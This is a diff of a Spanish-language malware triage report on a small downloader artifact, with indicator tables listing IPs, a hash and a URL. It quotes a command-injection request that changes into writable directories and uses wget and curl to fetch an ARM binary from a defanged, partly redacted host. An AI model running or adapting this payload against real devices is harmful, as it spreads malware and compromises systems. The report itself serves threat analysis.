@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 488 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `nz.arm7` en `hxxp://94.154.43.XXX/nz/nz.arm7`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:56:46+00:00`
+- **Registrado:** `2026-08-09T19:56:46.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -51,11 +52,11 @@ GET /shell?cd/tmp||cd/var/run||cd/mnt||cd/root||cd/; wget hxxp://94.154.43.XXX/n
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
+| url | hxxp://94.154.43.XXX/nz/nz.arm7; | strings |
 | ip | 190.179.169.XXX | static_analysis |
 | ip | 94.154.43.XXX | static_analysis |
-| url | hxxp://94.154.43.XXX/nz/nz.arm7; | strings |
-| hash | cf3fe5d2b21fb326de5d4b3561d6fdfe5073dba64c24a95c30a26b691c93dd8f | static_analysis |
 | command | GET /shell?cd/tmp\|\|cd/var/run\|\|cd/mnt\|\|cd/root\|\|cd/; wget hxxp://94.154.43.XXX/nz/nz.arm7; curl -O hxxp://94.154.43.XXX/ | strings |
+| hash | cf3fe5d2b21fb326de5d4b3561d6fdfe5073dba64c24a95c30a26b691c93dd8f | static_analysis |
 
 ## 🔎 Triage
 
